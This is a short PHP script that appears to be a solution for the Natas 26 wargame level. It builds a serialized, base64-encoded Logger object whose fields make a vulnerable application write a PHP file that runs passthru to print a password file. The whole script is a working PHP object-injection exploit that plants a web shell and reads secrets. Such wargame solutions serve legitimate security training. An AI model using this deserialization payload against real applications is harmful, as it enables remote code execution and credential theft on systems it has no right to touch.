<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct()
    {
        $this->initMsg= "----\n";
        $this->exitMsg= "<?php echo 'natas27 Password: '; passthru('cat /etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "/var/www/natas/natas26/img/secret.php";
    }
}

$logger = new Logger();
$logger = base64_encode(serialize($logger));
file_put_contents('natas26_serialized.txt', $logger);
?>
